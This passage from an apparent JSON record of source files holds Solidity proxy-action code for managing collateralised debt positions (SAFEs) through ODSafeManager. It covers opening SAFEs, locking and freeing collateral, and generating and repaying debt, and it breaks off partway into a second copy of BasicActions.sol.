uint256 _safeId,\n    uint256 _deltaWad\n  ) internal {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(_coinJoin, _safeInfo.safeHandler, _deltaWad);\n\n    // Paybacks debt to the SAFE\n    _modifySAFECollateralization(\n      _manager, _safeId, 0, _getRepaidDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n  }\n\n  /// @notice Routes the openSAFE call to the ODSafeManager contract\n  function _openSAFE(address _manager, bytes32 _cType, address _usr) internal returns (uint256 _safeId) {\n    _safeId = ODSafeManager(_manager).openSAFE(_cType, _usr);\n  }\n\n  /// @notice Routes the transferCollateral call to the ODSafeManager contract\n  function _transferCollateral(address _manager, uint256 _safeId, address _dst, uint256 _deltaWad) internal {\n    if (_deltaWad == 0) return;\n    ODSafeManager(_manager).transferCollateral(_safeId, _dst, _deltaWad);\n  }\n\n  /// @notice Routes the transferInternalCoins call to the ODSafeManager contract\n  function _transferInternalCoins(address _manager, uint256 _safeId, address _dst, uint256 _rad) internal {\n    ODSafeManager(_manager).transferInternalCoins(_safeId, _dst, _rad);\n  }\n\n  /// @notice Routes the modifySAFECollateralization call to the ODSafeManager contract\n  function _modifySAFECollateralization(\n    address _manager,\n    uint256 _safeId,\n    int256 _deltaCollateral,\n    int256 _deltaDebt\n  ) internal {\n    ODSafeManager(_manager).modifySAFECollateralization(_safeId, _deltaCollateral, _deltaDebt);\n  }\n\n  /**\n   * @notice Joins collateral and exits an amount of COIN\n   */\n  function _lockTokenCollateralAndGenerateDebt(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _collateralAmount,\n    uint256 _deltaWad\n  ) internal {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Takes token amount from user's wallet and joins into the safeEngine\n    _joinCollateral(_collateralJoin, _safeInfo.safeHandler, _collateralAmount);\n\n    // Locks token amount into the SAFE and generates debt\n    _modifySAFECollateralization(\n      _manager,\n      _safeId,\n      _collateralAmount.toInt(),\n      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)\n    );\n\n    // Exits and transfers COIN amount to the user's address\n    _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /**\n   * @notice Transfers an amount of COIN to the proxy address and exits to the user's address\n   */\n  function _collectAndExitCoins(address _manager, address _coinJoin, uint256 _safeId, uint256 _deltaWad) internal {\n    // Moves the COIN amount to proxy's address\n    _transferInternalCoins(_manager, _safeId, address(this), _deltaWad * RAY);\n    // Exits the COIN amount to the user's address\n    _exitSystemCoins(_coinJoin, _deltaWad * RAY);\n  }\n\n  /**\n   * @notice Transfers an amount of collateral to the proxy address and exits collateral tokens to the user\n   */\n  function _collectAndExitCollateral(\n    address _manager,\n    address _collateralJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) internal {\n    // Moves the amount from the SAFE handler to proxy's address\n    _transferCollateral(_manager, _safeId, address(this), _deltaWad);\n    // Exits a rounded down amount of collateral\n    _exitCollateral(_collateralJoin, _deltaWad);\n  }\n\n  // --- Methods ---\n\n  /// @inheritdoc IBasicActions\n  function openSAFE(address _manager, bytes32 _cType, address _usr) external delegateCall returns (uint256 _safeId) {\n    return _openSAFE(_manager, _cType, _usr);\n  }\n\n  /// @inheritdoc IBasicActions\n  function generateDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    _generateDebt(_manager, _taxCollector, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    _repayDebt(_manager, _taxCollector, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function lockTokenCollateral(\n    address _manager,\n    address _collateralJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n\n    // Takes token amount from user's wallet and joins into the safeEngine\n    _joinCollateral(_collateralJoin, _safeInfo.safeHandler, _deltaWad);\n\n    // Locks token amount in the safe\n    _modifySAFECollateralization(_manager, _safeId, _deltaWad.toInt(), 0);\n  }\n\n  /// @inheritdoc IBasicActions\n  function freeTokenCollateral(\n    address _manager,\n    address _collateralJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    // Unlocks token amount from the SAFE\n    _modifySAFECollateralization(_manager, _safeId, -_deltaWad.toInt(), 0);\n    // Transfers token amount to the user's address\n    _collectAndExitCollateral(_manager, _collateralJoin, _safeId, _deltaWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayAllDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId\n  ) external delegateCall {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    ISAFEEngine.SAFE memory _safeData = ISAFEEngine(_safeEngine).safes(_safeInfo.collateralType, _safeInfo.safeHandler);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(\n      _coinJoin,\n      address(this),\n      _getRepaidDebt(_safeEngine, address(this), _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n\n    // Paybacks debt to the SAFE (allowed because reducing debt of the SAFE)\n    ISAFEEngine(_safeEngine).modifySAFECollateralization({\n      _cType: _safeInfo.collateralType,\n      _safe: _safeInfo.safeHandler,\n      _collateralSource: address(this),\n      _debtDestination: address(this),\n      _deltaCollateral: 0,\n      _deltaDebt: -int256(_safeData.generatedDebt)\n    });\n  }\n\n  /// @inheritdoc IBasicActions\n  function lockTokenCollateralAndGenerateDebt(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safe,\n    uint256 _collateralAmount,\n    uint256 _deltaWad\n  ) external delegateCall {\n    _lockTokenCollateralAndGenerateDebt(\n      _manager, _taxCollector, _collateralJoin, _coinJoin, _safe, _collateralAmount, _deltaWad\n    );\n  }\n\n  /// @inheritdoc IBasicActions\n  function openLockTokenCollateralAndGenerateDebt(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    bytes32 _cType,\n    uint256 _collateralAmount,\n    uint256 _deltaWad\n  ) external delegateCall returns (uint256 _safe) {\n    _safe = _openSAFE(_manager, _cType, address(this));\n\n    _lockTokenCollateralAndGenerateDebt(\n      _manager, _taxCollector, _collateralJoin, _coinJoin, _safe, _collateralAmount, _deltaWad\n    );\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayDebtAndFreeTokenCollateral(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _collateralWad,\n    uint256 _debtWad\n  ) external delegateCall {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(_coinJoin, _safeInfo.safeHandler, _debtWad);\n\n    // Paybacks debt to the SAFE and unlocks token amount from it\n    _modifySAFECollateralization(\n      _manager,\n      _safeId,\n      -_collateralWad.toInt(),\n      _getRepaidDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n\n    // Transfers token amount to the user's address\n    _collectAndExitCollateral(_manager, _collateralJoin, _safeId, _collateralWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayAllDebtAndFreeTokenCollateral(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _collateralWad\n  ) external delegateCall {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    ISAFEEngine.SAFE memory _safeData = ISAFEEngine(_safeEngine).safes(_safeInfo.collateralType, _safeInfo.safeHandler);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(\n      _coinJoin,\n      _safeInfo.safeHandler,\n      _getRepaidDebt(_safeEngine, _safeInfo.safeHandler, _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n\n    // Paybacks debt to the SAFE and unlocks token amount from it\n    _modifySAFECollateralization(_manager, _safeId, -_collateralWad.toInt(), -_safeData.generatedDebt.toInt());\n\n    // Transfers token amount to the user's address\n    _collectAndExitCollateral(_manager, _collateralJoin, _safeId, _collateralWad);\n  }\n}"
    },
    {
      "filename": "src/contracts/proxies/actions/BasicActions.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.19;\n\nimport {ODSafeManager} from '@contracts/proxies/ODSafeManager.sol';\nimport {ODProxy} from '@contracts/proxies/ODProxy.sol';\n\nimport {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';\nimport {ICoinJoin} from '@interfaces/utils/ICoinJoin.sol';\nimport {ITaxCollector} from '@interfaces/ITaxCollector.sol';\nimport {ICollateralJoin} from '@interfaces/utils/ICollateralJoin.sol';\nimport {IERC20Metadata} from '@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol';\nimport {IBasicActions} from '@interfaces/proxies/actions/IBasicActions.sol';\n\nimport {Math, WAD, RAY, RAD} from '@libraries/Math.sol';\n\nimport {CommonActions} from '@contracts/proxies/actions/CommonActions.sol';\n\n/**\n * @title  BasicActions\n * @notice This contract defines the actions that can be executed to manage a SAFE\n */\ncontract BasicActions is CommonActions, IBasicActions {\n  using Math for uint256;\n\n  // --- Internal functions ---\n\n  /**\n   * @notice Gets delta debt generated for delta wad (always positive)\n   * @dev    Total SAFE debt minus available safeHandler COIN balance\n   */\n  function _getGeneratedDeltaDebt(\n    address _safeEngine,\n    bytes32 _cType,\n    address _safeHandler,\n    uint256 _deltaWad\n  ) internal view returns (int256 _deltaDebt) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n    // If there was already enough COIN in the safeEngine balance, just exits it without adding more debt\n    if (_coinAmount < _deltaWad * RAY) {\n      // Calculates the needed deltaDebt so together with the existing coins in the safeEngine is enough to exit wad amount of COIN tokens\n      _deltaDebt = ((_deltaWad * RAY - _coinAmount) / _rate).toInt();\n      // This is neeeded due lack of precision. It might need to sum an extra deltaDebt wei (for the given COIN wad amount)\n      _deltaDebt = uint256(_deltaDebt) * _rate < _deltaWad * RAY ? _deltaDebt + 1 : _deltaDebt;\n    }\n  }\n\n  /**\n   * @notice Gets repaid delta debt generated\n   * @dev    The rate adjusted debt of the SAFE\n   */\n  function _getRepaidDeltaDebt(\n    address _safeEngine,\n    bytes32 _cType,\n    address _safeHandler\n  ) internal view returns (int256 _deltaDebt) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _generatedDebt = ISAFEEngine(_safeEngine).safes(_cType, _safeHandler).generatedDebt;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n    // Uses the whole coin balance in the safeEngine to reduce the debt\n    _deltaDebt = (_coinAmount / _rate).toInt();\n    // Checks the calculated deltaDebt is not higher than safe.generatedDebt (total debt), otherwise uses its value\n    _deltaDebt = uint256(_deltaDebt) <= _generatedDebt ? -_deltaDebt : -_generatedDebt.toInt();\n  }\n\n  /**\n   * @notice Gets repaid debt\n   * @dev    The rate adjusted SAFE's debt minus COIN balance available in usr's address\n   */\n  function _getRepaidDebt(\n    address _safeEngine,\n    address _usr,\n    bytes32 _cType,\n    address _safeHandler\n  ) internal view returns (uint256 _deltaWad) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _generatedDebt = ISAF"
    }
  ]
}